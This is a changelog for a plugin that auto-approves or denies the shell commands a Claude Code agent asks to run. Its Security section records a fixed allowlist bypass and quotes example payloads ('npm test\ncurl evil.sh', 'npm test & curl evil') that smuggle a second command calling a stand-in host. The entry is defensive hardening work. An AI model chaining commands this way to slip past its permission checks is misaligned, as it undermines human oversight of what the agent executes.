# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed
- The PermissionRequest hook now always exits `0`. Its stdout carries the decision (`allow`/`deny`), or is empty to defer to Claude Code's own permission prompt; the previous "exit 1 to defer" protocol was never implemented and is not used.
- A denylist hit now blocks the command outright (`behavior: "deny"` with a message) instead of falling back to a prompt. The echoed command text and the matched rule name in that message are each truncated at 200 characters.

### Security
- Fixed allowlist bypass (br-0hat): newline, single `&` and `|&` are now command separators, so every chained command must match the allowlist (previously `npm test\ncurl evil.sh` and `npm test & curl evil` auto-allowed under `Bash(npm test:*)`).
- The PermissionRequest hook no longer emits the invalid `behavior: "ask"` (Claude Code accepts only `allow`/`deny`). Cases that meant "ask the user" now print no decision and exit 0, so Claude Code shows its own permission prompt, and a denylist hit now returns `behavior: "deny"` with a message instead of being silently discarded.
- The hook command in `hooks.json` is now shell-quoted (`"\"${CLAUDE_PLUGIN_ROOT}/hooks/permitter.js\""`), so an install path containing a space no longer exits 127.
- Redirections to or from a path (`>`, `>>`, `<`, `&>`, `&>>`) and unmatched redirect targets now make the parser throw, so the hook falls back to the normal permission dialog instead of silently dropping the target. Conservatively still allowed: fd merging (`2>&1`, `>&2`, `2>&-`) and redirects to exactly `/dev/null`.
- Unquoted subshell/grouping parentheses now also defer to the permission dialog (command/process substitution and here-docs already did).

### Added
- Initial package structure
- Plugin manifest (plugin.json)
- Hook configuration (hooks.json)
- Main hook entrypoint (permitter.js)
- Environment variable configuration (ENSEMBLE_PERMITTER_DISABLE, PERMITTER_DEBUG, PERMITTER_STRICT)
- Stdin JSON parsing for hook data
- Exit code protocol (0 = allow, 1 = defer)
- Debug logging to stderr
- Stub modules for command-parser, allowlist-loader, and matcher
- README.md documentation
- CHANGELOG.md

## [1.0.0] - TBD

### Added
- Full command parsing with state machine tokenizer
- Operator detection and command splitting
- Environment variable and wrapper stripping
- Subshell extraction (bash -c)
- Settings file loading and merging
- Pattern matching implementation
- Comprehensive test suite
- Security hardening with adversarial tests
